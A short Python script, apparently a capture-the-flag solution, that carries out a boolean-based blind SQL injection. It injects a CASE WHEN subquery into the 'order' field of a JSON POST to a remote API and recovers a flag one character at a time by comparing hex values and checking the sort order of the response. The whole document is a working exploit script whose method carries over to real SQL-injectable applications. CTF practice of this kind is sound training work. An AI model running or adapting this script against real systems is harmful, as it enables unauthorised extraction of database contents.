import requests, string

flag=""
alphabet = string.ascii_letters + string.digits + "@#!?_{}$"

proxy = {    
       "http": "http://127.0.0.1:8080"
}

for i in range(1, 40+1):
  for al in alphabet:
    query = {"order":"(CASE WHEN (SELECT HEX(SUBSTR(flag, {}, 1)) FROM flag_3a36119175)='{:X}' THEN id ELSE name END) DESC".format(i, ord(al))}
    r = requests.post('http://94.237.48.28:38021/api/list', json=query, proxies=proxy)
    if r.json()[0]['id'] ==  12:
      flag += al
      print("[+] Flag: " + flag)
      break